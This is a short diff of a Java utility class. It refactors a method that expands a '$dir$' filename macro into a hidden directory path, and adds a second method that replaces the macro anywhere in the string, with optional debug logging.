@@ -37,25 +37,54 @@ public class Directory {
 	 */
 	public static String expandMacro(final String filename) {
 		final int macro = filename.indexOf(hiddenDirMacro, 0);
-		String expandedFilter = filename;
+		String expandedFilter;
 		
-		if (macro == 0) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " expanding macro");
-			}
-			
-			// final String first = filter.substring(0, macro);
-			final String end = filename.substring(macro + hiddenDirMacro.length(), filename.length());
-			expandedFilter = Utils.chomp(Path.hidden(), "/") + end; // Path.UPLOAD_DIR
-			
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " expandedFilter: " + expandedFilter);
-			}
+		if (macro != 0) {
+			return filename;
+		}
+		
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " expanding macro");
+		}
+
+		// final String first = filter.substring(0, macro);
+		final String end = filename.substring(macro + hiddenDirMacro.length(), filename.length());
+		expandedFilter = Utils.chomp(Path.hidden(), "/") + end; // Path.UPLOAD_DIR
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " expandedFilter: " + expandedFilter);
 		}
 		
 		return expandedFilter;
 	}
 
+	/**
+	 * Transforms "something $dir$/other/" to "something /path/to/hidden/other/"
+	 * 
+	 * @param filename
+	 *            the filename
+	 * @return the string
+	 */
+	public static String expandHiddenDir(final String filename) {
+		final int macro = filename.indexOf(hiddenDirMacro, 0);
+		String expandedFilter;
+		
+		if (macro == -1) {
+			return filename;
+		}
+		
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " expanding macro");
+		}
+
+		expandedFilter = filename.replaceFirst("\\$dir\\$", Utils.chomp(Path.hidden(), "/"));
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " expandedFilter: " + expandedFilter);
+		}
+		
+		return expandedFilter;
+	}
 	// TODO
 	/**
 	 * Find.
